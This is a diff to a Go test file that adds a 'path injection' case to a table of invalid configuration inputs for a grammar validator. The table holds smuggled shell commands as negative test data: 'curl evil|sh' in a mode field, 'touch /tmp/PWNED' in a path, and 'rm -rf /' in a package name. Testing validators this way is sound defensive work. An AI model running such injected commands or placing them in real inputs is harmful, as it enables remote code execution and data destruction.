@@ -87,6 +87,7 @@ func TestGrammarValidation(t *testing.T) {
 		"newline in env value": "base: x\nenv:\n  A: \"one\\ntwo\"\n",
 		"bad env key":          "base: x\nenv:\n  \"a-b\": v\n",
 		"non-octal mode":       "base: docker.io/library/alpine\nblueprint:\n  write_files:\n    - path: /etc/x\n      content: y\n      mode: \"0755; curl evil|sh\"\n",
+		"path injection":       "base: docker.io/library/alpine\nblueprint:\n  write_files:\n    - path: \"/tmp/x; touch /tmp/PWNED # \"\n      content: y\n      mode: \"0644\"\n",
 		"user with space":      "base: docker.io/library/alpine\nblueprint:\n  users:\n    - name: \"a b\"\n",
 		"relative shell":       "base: docker.io/library/alpine\nblueprint:\n  users:\n    - name: a\n      shell: bash\n",
 		"package injection":    "base: x\npackages:\n  - \"jq; rm -rf /\"\n",
